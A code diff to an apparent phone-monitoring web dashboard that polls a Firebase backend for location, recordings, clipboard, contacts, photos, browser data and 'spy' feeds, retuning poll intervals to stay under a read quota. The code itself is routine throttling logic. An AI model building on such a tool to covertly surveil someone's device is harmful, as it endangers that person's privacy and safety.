@@ -2083,7 +2083,8 @@ let playbackLoop = false;
 
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 900000, logcat: 300000, remote: 30000, photos: 600000, videos: 60000, health: 3600000, mirror: 10000, spy: 10000, clipboard: 30000, files: 60000, appVer: 30000, browser: 60000, activity: 60000, ai: 60000, timeline: 60000, savedWifi: 60000, cellInfo: 60000, simSlots: 60000 };
+// Sustainable baseline: ~34K reads/day parked, ~42K away (loc 10s) — stays under 50K quota. Before: 146K/day.
+const BASE_INTERVALS = { loc: 10000, hist: 600000, meta: 60000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 900000, logcat: 300000, remote: 60000, photos: 600000, videos: 300000, health: 3600000, mirror: 120000, spy: 60000, clipboard: 60000, files: 840000, appVer: 60000, browser: 300000, activity: 120000, ai: 300000, timeline: 300000, savedWifi: 3600000, cellInfo: 300000, simSlots: 3600000, queue: 60000, wifi: 300000, nearby: 300000, logcatToggle: 60000, heat: 120000, updatePause: 60000, appSnapshots: 60000, syncToggles: 60000, tuning: 60000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -2111,13 +2112,23 @@ function trackRead(count = 1) {
   if (readBudget.day !== today) { readBudget = { count: 0, day: today }; }
   readBudget.count += count;
   localStorage.setItem('readBudget', JSON.stringify(readBudget));
-  document.getElementById('readBudget').textContent = `\u{1F4CA} ${readBudget.count.toLocaleString()}/50K`;
-  if (readBudget.count > 40000) {
-    intervals.hist = 600000; intervals.meta = 120000;
-    intervals.photos = 600000; intervals.apps = 600000; intervals.voice = 600000; intervals.remote = 60000;
-    showAlert('Approaching Firebase read limit \u2014 reduced poll rate', 'warn');
+  const rbEl = document.getElementById('readBudget');
+  if (rbEl) rbEl.textContent = `\u{1F4CA} ${readBudget.count.toLocaleString()}/50K`;
+  // Tiered throttle to stay under 50K quota. Base parked ~34K/day; gentle at 30K, reduced at 40K, critical at 45K.
+  if (readBudget.count > 45000) {
+    intervals = { ...BASE_INTERVALS, loc: 30000, meta: 180000, mirror: 300000, spy: 300000, tuning: 300000, syncToggles: 180000, clipboard: 300000, activity: 600000, appVer: 300000, queue: 180000, heat: 600000, updatePause: 180000, appSnapshots: 300000, remote: 300000, wifi: 600000, nearby: 600000, logcat: 600000, logcatToggle: 300000, videos: 600000, browser: 600000, ai: 600000, timeline: 600000, cellInfo: 600000 };
+    if (readBudget.count % 60 === 0) showAlert('Firebase quota critical (' + readBudget.count.toLocaleString() + '/50K) — minimal polling until midnight', 'warn');
+    if (rbEl) rbEl.style.color = 'var(--danger)';
+  } else if (readBudget.count > 40000) {
+    intervals = { ...BASE_INTERVALS, meta: 120000, mirror: 300000, spy: 120000, tuning: 120000, syncToggles: 120000, clipboard: 120000, activity: 300000, appVer: 120000, queue: 120000, heat: 300000, updatePause: 120000, appSnapshots: 120000, remote: 120000, wifi: 600000, nearby: 600000, logcat: 600000, videos: 600000 };
+    if (readBudget.count % 80 === 0) showAlert('Approaching Firebase read limit — reduced poll rate', 'warn');
+    if (rbEl) rbEl.style.color = 'var(--warning)';
+  } else if (readBudget.count > 30000) {
+    intervals = { ...BASE_INTERVALS, mirror: 180000, spy: 90000, tuning: 90000, syncToggles: 90000 };
+    if (rbEl) rbEl.style.color = '';
   } else {
     intervals = { ...BASE_INTERVALS };
+    if (rbEl) rbEl.style.color = '';
   }
 }
 
@@ -3481,34 +3492,34 @@ function startPolling() {
   pollLocation();
   schedulePoll('meta', intervals.meta, pollMeta);
   schedulePoll('apps', intervals.apps, () => refreshAppsTab(false));
-  schedulePoll('appSnapshots', 30000, pollAppSnapshots);
+  schedulePoll('appSnapshots', intervals.appSnapshots, pollAppSnapshots);
   schedulePoll('hist', intervals.hist, pollHistory);
   schedulePoll('voice', intervals.voice, pollVoiceNotes);
   schedulePoll('remote', intervals.remote, pollRemoteRecordings);
   schedulePoll('contacts', intervals.contacts, pollContacts);
   schedulePoll('perms', intervals.perms, pollPermissions);
   schedulePoll('fcm', intervals.fcm, pollFcmToken);
-  schedulePoll('queue', 30000, pollQueueSize);
-  schedulePoll('wifi', 60000, pollWifiScans);
-  schedulePoll('nearby', 60000, pollNearbyScans);
-  schedulePoll('logcat', 60000, pollLogcat);
-  schedulePoll('logcatToggle', 15000, pollLogcatToggleState);
+  schedulePoll('queue', intervals.queue, pollQueueSize);
+  schedulePoll('wifi', intervals.wifi, pollWifiScans);
+  schedulePoll('nearby', intervals.nearby, pollNearbyScans);
+  schedulePoll('logcat', intervals.logcat, pollLogcat);
+  schedulePoll('logcatToggle', intervals.logcatToggle, pollLogcatToggleState);
   schedulePoll('health', intervals.health, pollHealth);
   schedulePoll('mirror', intervals.mirror, pollMirroring);
   schedulePoll('spy', intervals.spy, pollSpy);
   schedulePoll('appVer', intervals.appVer, pollAppVer);
   schedulePoll('photos', intervals.photos, pollPhotos);
-  schedulePoll('videos', 60000, pollVideos);
+  schedulePoll('videos', intervals.videos, pollVideos);
   schedulePoll('clipboard', intervals.clipboard, pollClipboard);
-  schedulePoll('activity', intervals.activity || 60000, pollActivity);
-  schedulePoll('simSlots', intervals.simSlots || 60000, pollSimSlots);
-  schedulePoll('cellInfo', intervals.cellInfo || 60000, pollCellInfo);
-  schedulePoll('savedWifi', intervals.savedWifi || 60000, pollSavedWifi);
-  schedulePoll('syncToggles', 10000, pollSyncToggles);
-  schedulePoll('tuning', 10000, pollTuning);
-  schedulePoll('heat', 30000, pollHeat);
-  schedulePoll('updatePause', 30000, pollUpdatePause);
-  schedulePoll('files', 14 * 60 * 1000, pollFileInventory);
+  schedulePoll('activity', intervals.activity, pollActivity);
+  schedulePoll('simSlots', intervals.simSlots, pollSimSlots);
+  schedulePoll('cellInfo', intervals.cellInfo, pollCellInfo);
+  schedulePoll('savedWifi', intervals.savedWifi, pollSavedWifi);
+  schedulePoll('syncToggles', intervals.syncToggles, pollSyncToggles);
+  schedulePoll('tuning', intervals.tuning, pollTuning);
+  schedulePoll('heat', intervals.heat, pollHeat);
+  schedulePoll('updatePause', intervals.updatePause, pollUpdatePause);
+  schedulePoll('files', intervals.files, pollFileInventory);
 }
 
 function schedulePoll(name, interval, fn) {
